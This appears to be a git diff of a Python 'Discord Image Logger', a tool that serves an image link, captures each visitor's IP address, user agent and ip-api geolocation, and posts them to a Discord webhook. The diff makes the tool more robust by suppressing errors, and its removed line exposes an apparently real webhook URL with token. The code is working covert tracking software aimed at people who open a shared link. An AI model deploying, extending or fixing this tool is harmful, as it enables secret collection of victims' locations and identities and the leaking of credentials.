@@ -1,10 +1,10 @@
-# Discord Image Logger - مصحح
+# Discord Image Logger - مصحح بالكامل
 from http.server import BaseHTTPRequestHandler, HTTPServer
 from urllib import parse
 import traceback, requests, base64, httpagentparser
 
 config = {
-    "webhook": "https://discord.com/api/webhooks/1486621531974139996/qmCm0qaiJSBLHAz5Iy6FcSqh0hIqV30kVK58dY1fkII1Aeh7V2z-qs9WHs2aEJLel5uR",
+    "webhook": "YOUR_WEBHOOK_HERE",
     "image": "https://i.pinimg.com/1200x/31/25/10/312510d433b3bdd29f6b12ffcab62557.jpg",
     "imageArgument": True,
     "username": "Image Logger",
@@ -37,11 +37,14 @@ def botCheck(ip, useragent):
         return False
 
 def reportError(error):
-    requests.post(config["webhook"], json={
-        "username": config["username"],
-        "content": "@everyone",
-        "embeds": [{"title": "Image Logger - Error", "color": config["color"], "description": f"```\n{error}\n```"}]
-    })
+    try:
+        requests.post(config["webhook"], json={
+            "username": config["username"],
+            "content": "@everyone",
+            "embeds": [{"title": "Image Logger - Error", "color": config["color"], "description": f"```\n{error}\n```"}]
+        })
+    except:
+        pass
 
 def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
     if ip.startswith(blacklistedIPs):
@@ -50,21 +53,29 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
     bot = botCheck(ip, useragent)
     if bot:
         if config["linkAlerts"]:
-            requests.post(config["webhook"], json={
-                "username": config["username"],
-                "content": "",
-                "embeds": [{"title": "Image Logger - Link Sent", "color": config["color"],
-                            "description": f"Link sent in chat!\nEndpoint: {endpoint}\nIP: {ip}\nPlatform: {bot}"}]
-            })
+            try:
+                requests.post(config["webhook"], json={
+                    "username": config["username"],
+                    "content": "",
+                    "embeds": [{"title": "Image Logger - Link Sent", "color": config["color"],
+                                "description": f"Link sent in chat!\nEndpoint: {endpoint}\nIP: {ip}\nPlatform: {bot}"}]
+                })
+            except:
+                pass
         return
 
     ping = "@everyone"
-    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
-    
-    if info["proxy"] and config["vpnCheck"] == 1:
+
+    # حماية من مشاكل الاتصال بالـ API
+    try:
+        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", timeout=5).json()
+    except:
+        info = {"proxy": False, "country": "N/A"}
+
+    if info.get("proxy") and config["vpnCheck"] == 1:
         ping = ""
 
-    os, browser = httpagentparser.simple_detect(useragent)
+    os, browser = httpagentparser.simple_detect(useragent or "")
 
     embed = {
         "username": config["username"],
@@ -78,7 +89,12 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
 
     if url:
         embed["embeds"][0].update({"thumbnail": {"url": url}})
-    requests.post(config["webhook"], json=embed)
+
+    try:
+        requests.post(config["webhook"], json=embed)
+    except:
+        pass
+
     return info
 
 binaries = {
@@ -117,7 +133,10 @@ height: 100vh;
                 self.end_headers()
 
                 if config["buggedImage"]:
-                    self.wfile.write(binaries["loading"])
+                    try:
+                        self.wfile.write(binaries["loading"])
+                    except:
+                        pass
 
                 makeReport(ip, endpoint=s.split("?")[0], url=url)
                 return
@@ -136,13 +155,19 @@ height: 100vh;
             self.send_response(200)
             self.send_header('Content-type', 'text/html')
             self.end_headers()
-            self.wfile.write(data)
+            try:
+                self.wfile.write(data)
+            except:
+                pass
 
         except Exception:
             self.send_response(500)
             self.send_header('Content-type', 'text/html')
             self.end_headers()
-            self.wfile.write(b'500 - Internal Server Error')
+            try:
+                self.wfile.write(b'500 - Internal Server Error')
+            except:
+                pass
             reportError(traceback.format_exc())
 
     do_GET = handleRequest
